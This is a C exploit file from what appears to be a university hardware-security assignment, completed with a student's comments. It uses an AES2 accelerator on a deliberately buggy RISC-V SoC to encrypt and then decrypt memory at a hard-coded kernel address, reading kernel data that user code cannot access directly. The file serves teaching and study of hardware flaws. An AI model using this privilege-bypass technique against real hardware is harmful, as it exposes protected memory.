/////////////////////////////////////////////////////////////////////////////////////////////////////
//
//  - This is the template program file for exploit E3.
//  - Check the Appendix B of assignment manual for more details about the bug and
//    how the exploit is constructed.
//
//  - Command to run this file: ./make_run_user_with_pk.sh exploit3
//
//  - Submit the updated version of this file along with your pdf report.
//  - This report should be executable on the buggy SoC provided to you.
//  - Add comments where ever needed. Your program file will not be evaluated
//    without the comments.
//  - Search for the word 'EDIT' to find all the places where you need to edit
//    this file to complete the exploit
//
/////////////////////////////////////////////////////////////////////////////////////////////////////
//
//  - The flag for exploit 3 is the data used by the kernel code
//
/////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>

#include "ariane_api.h"  // includes all the API functions to access the peripherals



//////////////////////////////////
//
// Main function that runs the exploit
//
//////////////////////////////////
void main(void)
{
	printf("Running exploit 3\n");

    //////////////////////////////////
    // Generate a unique ID per student per exploit
    //////////////////////////////////

    char student_name[] = "Daniel Horan" ; // EDIT: replace the string with your first and last names

    print_student_id(student_name, 3);


    //////////////////////////////////
    //  Run the exploit
    //  - The exploit successfully recovers the data used by the kernel function, 'kernel_func1'
    //////////////////////////////////
		//assigning the address of the kernel data to 'pt'. The address 0x80009be8 was determined from the diag.dump file.
    //this address points to the kernel data that we aim to exploit using AES2 encryption and decryption.
    uint32_t *pt = (uint32_t *)0x80009be8;  // EDIT: update the address with the location where the kernel data is stored

                                 // its data in the executable, see the exploit 3 description in the manual for details
                                 // about how to find this address.
    uint32_t st[4]  = {0x2fde7038, 0x86532086, 0xfbbcb72c, 0x540578e0}; // some initial vector to do the encryption
    uint32_t ct[AES2_CT_WORDS];  // place holders for storing encrypted data
    uint32_t pt2[AES2_CT_WORDS]; // place holders for storing decrypted data

    uint32_t key_sel = 0; // selecting key 0


    // call AES2 encryption with key 0. this will encrypt the kernel data using AES2
    // EDIT: write the function for aes2 encryption. this is similar to the encryption we did in line 54 of exploit1.c

																					//encrypting the kernel data at 'pt' using the AES2 encryption function.
		aes2_encrypt(pt, st, ct, key_sel);		//'st' is the initial vector, 'ct' will hold the encrypted data, and 'key_sel' specifies the key (key 0) to be used for encryption.
																					//this step encrypts the data at the kernel memory address, making it accessible for decryption in the next step.;

    // print the ciphered text as output
    printf("aes2 enc %08x %08x %08x %08x\n", ct[0], ct[1], ct[2], ct[3]);


    // now, call AES decryption with key 0. This will decrypt the encrypted kernel data so that we can recover it.
    // EDIT: complete the aes2 decrypt function. the arguments are similar to the encrypt function

																					 //decrypting the previously encrypted kernel data using the AES2 decryption function.
		aes2_decrypt(ct, st, pt2, key_sel);    //the encrypted data 'ct' and the same initial vector 'st' are used, with 'pt2' designated to receive the decrypted data.
																					 //this stepreverses the encryption, showing the original kernel data in a decrypted form.


    // print the plain text from AES as output since this is the kernel data we want
    // EDIT: print the flag, i.e., the data in pt2
		//this output represents the successfully retrieved kernel data, effectively demonstrating the exploitation of the vulnerability.
    printf("Decrypted kernel data: %08x %08x %08x %08x\n", pt2[0], pt2[1], pt2[2], pt2[3]);

    // this is just for demonstration purpose.
    // if you try to access the data used by the kernel_func1 directly without running the exploit,
    // the processor will throw segfault since user code does not have access to kernel data
    printf("try to access directly: %016x \n",  *pt);


    return;
}
